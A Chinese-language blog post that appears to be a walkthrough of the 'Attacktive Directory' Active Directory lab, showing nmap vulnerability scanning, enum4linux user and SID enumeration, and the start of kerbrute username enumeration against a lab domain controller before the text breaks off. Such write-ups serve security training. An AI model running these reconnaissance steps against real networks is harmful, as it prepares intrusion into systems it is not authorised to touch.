<!DOCTYPE html>
<html lang=zh-CN>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta property="og:description" content="z4yn的博客">
    <meta property="og:type" content="website">
    <meta name="description" content="z4yn的博客">
    <meta name="keyword"  content="OSCP,PTE">
    <link rel="shortcut icon" href="/img/favicon.ico">

    <title>
        
        Attacktive Directory - Z4yn&#39;s blog
        
    </title>

    <!-- Custom CSS -->
    
<link rel="stylesheet" href="/css/aircloud.css">

    
<link rel="stylesheet" href="/css/gitment.css">

    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
    <link href="//at.alicdn.com/t/font_620856_28hi1hpxx24.css" rel="stylesheet" type="text/css">
    <!-- ga & ba script hoook -->
    <script></script>
<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="Z4yn's blog" type="application/atom+xml">
</head>

<body>

<div class="site-nav-toggle" id="site-nav-toggle">
    <button>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
    </button>
</div>

<div class="index-about">
    <i> Better to light one candle than to curse the darkness. </i>
</div>

<div class="index-container">
    
    <div class="index-left">
        
<div class="nav" id="nav">
    <div class="avatar-name">
        <div class="avatar ">
            <img src="/img/avatar.jpg" />
        </div>
        <div class="name">
            <i>Z4yn&#39;s blog</i>
        </div>
    </div>
    <div class="contents" id="nav-content">
        <ul>
            <li >
                <a href="/">
                    <i class="iconfont icon-shouye1"></i>
                    <span>主页</span>
                </a>
            </li>
            <li >
                <a href="/tags">
                    <i class="iconfont icon-biaoqian1"></i>
                    <span>标签</span>
                </a>
            </li>
            <li >
                <a href="/archive">
                    <i class="iconfont icon-guidang2"></i>
                    <span>存档</span>
                </a>
            </li>
            <li >
                <a href="/collect/">
                    <i class="iconfont icon-shoucang1"></i>
                    <span>收藏</span>
                </a>
            </li>
            <li >
                <a href="/about/">
                    <i class="iconfont icon-guanyu2"></i>
                    <span>关于</span>
                </a>
            </li>
            
            <li>
                <a id="search">
                    <i class="iconfont icon-sousuo1"></i>
                    <span>搜索</span>
                </a>
            </li>
            
        </ul>
    </div>
    
        <div id="toc" class="toc-article">
    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">#0 信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-enum4linux-%E6%9E%9A%E4%B8%BE%E7%AB%AF%E5%8F%A3-139-445"><span class="toc-text">#1 enum4linux 枚举端口 139&#x2F;445</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%80%9A%E8%BF%87-Kerberos-%E6%9E%9A%E4%B8%BE%E7%94%A8%E6%88%B7"><span class="toc-text">#2 通过 Kerberos 枚举用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%BB%A5%E7%94%A8-Kerberos"><span class="toc-text">#3 滥用 Kerberos</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Evil-WinRM-%E7%99%BB%E5%BD%95%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8"><span class="toc-text">#4 Evil-WinRM 登录域控制器</span></a></li></ol>
</div>
    
</div>


<div class="search-field" id="search-field">
    <div class="search-bg" id="search-bg"></div>
    <div class="search-container">
        <div class="search-input">
            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
            <input id="search-input"/>
            <span id="begin-search">搜索</span>
        </div>
        <div class="search-result-container" id="search-result-container">

        </div>
    </div>
</div>

        <div class="index-about-mobile">
            <i> Better to light one candle than to curse the darkness. </i>
        </div>
    </div>
    
    <div class="index-middle">
        <!-- Main Content -->
        


<div class="post-container">
    <div class="post-title">
        Attacktive Directory
    </div>

    <div class="post-meta">
        <span class="attr">发布于：<span>2022-11-07 15:44:32</span></span>
        
        </span>
        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
</span>
</span>
    </div>
    <div class="post-content no-indent">
        <h3 id="0-信息收集"><a href="#0-信息收集" class="headerlink" title="#0 信息收集"></a>#0 信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># nmap 10.10.193.76 -p53,80,88,135,139,445,593,3268,3269,3389 -sV -sC -sT --script vuln -Pn</span></span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-30 10:13 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.193.76</span><br><span class="line">Host is up (0.24s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">80/tcp   open  http          Microsoft IIS httpd 10.0</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-05-30 02:14:15Z)</span></span><br><span class="line"><span class="string">135/tcp  open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span></span><br><span class="line"><span class="string">445/tcp  open  microsoft-ds?</span></span><br><span class="line"><span class="string">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span></span><br><span class="line"><span class="string">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)</span></span><br><span class="line"><span class="string">3269/tcp open  tcpwrapped</span></span><br><span class="line"><span class="string">|_ssl-ccs-injection: No reply from server (TIMEOUT)</span></span><br><span class="line"><span class="string">|_tls-ticketbleed: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">3389/tcp open  ms-wbt-server Microsoft Terminal Services</span></span><br><span class="line"><span class="string">|_tls-ticketbleed: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Host script results:</span></span><br><span class="line"><span class="string">|_smb-vuln-ms10-054: false</span></span><br><span class="line"><span class="string">|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR</span></span><br><span class="line"><span class="string">|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 683.18 seconds</span></span><br></pre></td></tr></table></figure>



<h3 id="1-enum4linux-枚举端口-139-445"><a href="#1-enum4linux-枚举端口-139-445" class="headerlink" title="#1 enum4linux 枚举端口 139/445"></a>#1 enum4linux 枚举端口 139/445</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># enum4linux 10.10.193.76     </span></span><br><span class="line">Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon May 30 11:10:38 2022</span><br><span class="line"></span><br><span class="line"> ========================== </span><br><span class="line">|    Target Information    |</span><br><span class="line"> ========================== </span><br><span class="line">Target ........... 10.10.193.76</span><br><span class="line">RID Range ........ 500-550,1000-1050</span><br><span class="line">Username ......... <span class="string">&#x27;&#x27;</span></span><br><span class="line">Password ......... <span class="string">&#x27;&#x27;</span></span><br><span class="line">Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ==================================================== </span><br><span class="line">|    Enumerating Workgroup/Domain on 10.10.193.76    |</span><br><span class="line"> ==================================================== </span><br><span class="line">[E] Can<span class="string">&#x27;t find workgroup/domain</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ============================================ </span></span><br><span class="line"><span class="string">|    Nbtstat Information for 10.10.193.76    |</span></span><br><span class="line"><span class="string"> ============================================ </span></span><br><span class="line"><span class="string">Looking up status of 10.10.193.76</span></span><br><span class="line"><span class="string">No reply from 10.10.193.76</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ===================================== </span></span><br><span class="line"><span class="string">|    Session Check on 10.10.193.76    |</span></span><br><span class="line"><span class="string"> ===================================== </span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.</span></span><br><span class="line"><span class="string">[+] Server 10.10.193.76 allows sessions using username &#x27;</span><span class="string">&#x27;, password &#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.</span></span><br><span class="line"><span class="string">[+] Got domain/workgroup name: </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> =========================================== </span></span><br><span class="line"><span class="string">|    Getting domain SID for 10.10.193.76    |</span></span><br><span class="line"><span class="string"> =========================================== </span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.</span></span><br><span class="line"><span class="string">Domain Name: THM-AD</span></span><br><span class="line"><span class="string">Domain Sid: S-1-5-21-3591857110-2884097990-301047963</span></span><br><span class="line"><span class="string">[+] Host is part of a domain (not a workgroup)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ====================================== </span></span><br><span class="line"><span class="string">|    OS information on 10.10.193.76    |</span></span><br><span class="line"><span class="string"> ====================================== </span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.</span></span><br><span class="line"><span class="string">Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.</span></span><br><span class="line"><span class="string">[+] Got OS info for 10.10.193.76 from smbclient: </span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.</span></span><br><span class="line"><span class="string">[+] Got OS info for 10.10.193.76 from srvinfo:</span></span><br><span class="line"><span class="string">Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ============================= </span></span><br><span class="line"><span class="string">|    Users on 10.10.193.76    |</span></span><br><span class="line"><span class="string"> ============================= </span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.</span></span><br><span class="line"><span class="string">[E] Couldn&#x27;</span>t find users using querydispinfo: NT_STATUS_ACCESS_DENIED</span><br><span class="line"></span><br><span class="line">Use of uninitialized value <span class="variable">$global_workgroup</span> <span class="keyword">in</span> concatenation (.) or string at ./enum4linux.pl line 881.</span><br><span class="line">[E] Couldn<span class="string">&#x27;t find users using enumdomusers: NT_STATUS_ACCESS_DENIED</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ========================================= </span></span><br><span class="line"><span class="string">|    Share Enumeration on 10.10.193.76    |</span></span><br><span class="line"><span class="string"> ========================================= </span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.</span></span><br><span class="line"><span class="string">do_connect: Connection to 10.10.193.76 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	Sharename       Type      Comment</span></span><br><span class="line"><span class="string">	---------       ----      -------</span></span><br><span class="line"><span class="string">Reconnecting with SMB1 for workgroup listing.</span></span><br><span class="line"><span class="string">Unable to connect with SMB1 -- no workgroup available</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Attempting to map shares on 10.10.193.76</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ==================================================== </span></span><br><span class="line"><span class="string">|    Password Policy Information for 10.10.193.76    |</span></span><br><span class="line"><span class="string"> ==================================================== </span></span><br><span class="line"><span class="string">[E] Unexpected error from polenum:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Attaching to 10.10.193.76 using a NULL share</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Trying protocol 139/SMB...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	[!] Protocol failed: Cannot request session (Called Name:10.10.193.76)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Trying protocol 445/SMB...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	[!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - &#123;Access Denied&#125; A process has requested access to an object but has not been granted those access rights.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[E] Failed to get password policy with rpcclient</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ============================== </span></span><br><span class="line"><span class="string">|    Groups on 10.10.193.76    |</span></span><br><span class="line"><span class="string"> ============================== </span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Getting builtin groups:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Getting builtin group memberships:</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Getting local groups:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Getting local group memberships:</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Getting domain groups:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Getting domain group memberships:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ======================================================================= </span></span><br><span class="line"><span class="string">|    Users on 10.10.193.76 via RID cycling (RIDS: 500-550,1000-1050)    |</span></span><br><span class="line"><span class="string"> ======================================================================= </span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.</span></span><br><span class="line"><span class="string">[I] Found new SID: S-1-5-21-3591857110-2884097990-301047963</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.</span></span><br><span class="line"><span class="string">[I] Found new SID: S-1-5-21-3532885019-1334016158-1514108833</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742.</span></span><br><span class="line"><span class="string">[+] Enumerating users using SID S-1-5-21-3591857110-2884097990-301047963 and logon username &#x27;</span><span class="string">&#x27;, password &#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-500 THM-AD\Administrator (Local User)</span></span><br><span class="line"><span class="string">......</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-512 THM-AD\Domain Admins (Domain Group)</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-513 THM-AD\Domain Users (Domain Group)</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-514 THM-AD\Domain Guests (Domain Group)</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-515 THM-AD\Domain Computers (Domain Group)</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-516 THM-AD\Domain Controllers (Domain Group)</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-517 THM-AD\Cert Publishers (Local Group)</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-518 THM-AD\Schema Admins (Domain Group)</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-519 THM-AD\Enterprise Admins (Domain Group)</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-520 THM-AD\Group Policy Creator Owners (Domain Group)</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-521 THM-AD\Read-only Domain Controllers (Domain Group)</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-522 THM-AD\Cloneable Domain Controllers (Domain Group)</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-523 *unknown*\*unknown* (8)</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-524 *unknown*\*unknown* (8)</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-525 THM-AD\Protected Users (Domain Group)</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-526 THM-AD\Key Admins (Domain Group)</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-527 THM-AD\Enterprise Key Admins (Domain Group)</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-528 *unknown*\*unknown* (8)</span></span><br><span class="line"><span class="string">......</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-550 *unknown*\*unknown* (8)</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-1000 THM-AD\ATTACKTIVEDIREC$ (Local User)</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-1001 *unknown*\*unknown* (8)</span></span><br><span class="line"><span class="string">......</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3591857110-2884097990-301047963-1050 *unknown*\*unknown* (8)</span></span><br><span class="line"><span class="string">[+] Enumerating users using SID S-1-5-21-3532885019-1334016158-1514108833 and logon username &#x27;</span><span class="string">&#x27;, password &#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3532885019-1334016158-1514108833-500 ATTACKTIVEDIREC\Administrator (Local User)</span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.</span></span><br><span class="line"><span class="string">S-1-5-21-3532885019-1334016158-1514108833-501 ATTACKTIVEDIREC\Guest (Local User)</span></span><br><span class="line"><span class="string">......</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ============================================= </span></span><br><span class="line"><span class="string">|    Getting printer info for 10.10.193.76    |</span></span><br><span class="line"><span class="string"> ============================================= </span></span><br><span class="line"><span class="string">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 991.</span></span><br><span class="line"><span class="string">Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">enum4linux complete on Mon May 30 11:22:29 2022</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>



<h3 id="2-通过-Kerberos-枚举用户"><a href="#2-通过-Kerberos-枚举用户" class="headerlink" title="#2 通过 Kerberos 枚举用户"></a>#2 通过 Kerberos 枚举用户</h3><p>用户列表 : <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt">https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt</a></p>
<p>密码列表 : <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt">https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/thm/dc]</span><br><span class="line">└─<span class="comment"># ./kerbrute_linux_amd64 userenum -d spookysec.local --dc 10.10.122.125 userlist.txt </span></span><br><span class="line"></span><br><span class="line">    __             __               __     </span><br><span class="line">   / /_____  _____/ /_  _______  __/ /____ </span><br><span class="line">  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \</span><br><span class="line"> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/</span><br><span class="line">/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        </span><br><span class="line"></span><br><span class="line">Version: v1.0.3 (9dad6e1) - 